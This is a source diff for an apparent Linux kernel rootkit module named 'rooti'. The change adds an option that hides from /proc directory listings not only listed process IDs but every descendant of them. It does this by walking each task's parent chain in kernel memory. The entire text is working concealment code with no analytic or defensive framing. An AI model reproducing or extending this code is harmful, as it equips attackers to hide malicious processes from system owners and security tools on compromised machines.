@@ -1,6 +1,7 @@
 #include <linux/types.h>
 #include <linux/dirent.h>
 #include <linux/string.h>
+#include <linux/pid.h>
 #include "dentry.h"
 #include "../../state.h"
 #include "../../utils.h"
@@ -61,18 +62,48 @@ static bool rooti_should_hide_file(struct linux_dirent64 *record)
     return false;
 }
 
-// Determines whether the process (file in /proc) qualifies to be hidden
 static bool rooti_should_hide_proc(struct linux_dirent64 *record)
 {
     pid_t pid;
     int err;
 
-    // Try to convert the name of the file to a PID (if the file is even a PID file)
     err = kstrtoint(record->d_name, 0, &pid);
     if (err)
         return false;
 
+#ifndef ROOTI_HIDE_CHILD_PROCS
     return rooti_pid_list_contains(pid, &rooti_hidden_pids);
+#else
+    struct pid *pid_struct;
+    struct task_struct *task;
+
+    rcu_read_lock();
+
+    pid_struct = find_vpid(pid);
+    if (pid_struct == NULL) {
+        rcu_read_unlock();
+        ROOTI_DEBUG("find_vpid() failed");
+        return false;
+    }
+        
+    task = pid_task(pid_struct, PIDTYPE_PID);
+    if (task == NULL) {
+        rcu_read_unlock();
+        ROOTI_DEBUG("pid_task() failed");
+        return false;
+    }
+
+    while (task != &init_task) {
+        if (rooti_pid_list_contains(task->pid, &rooti_hidden_pids)) {
+            rcu_read_unlock();
+            return true;
+        }
+        task = rcu_dereference(task->real_parent); 
+    }
+    
+    rcu_read_unlock();
+    return false;
+#endif
 }
 
 /*
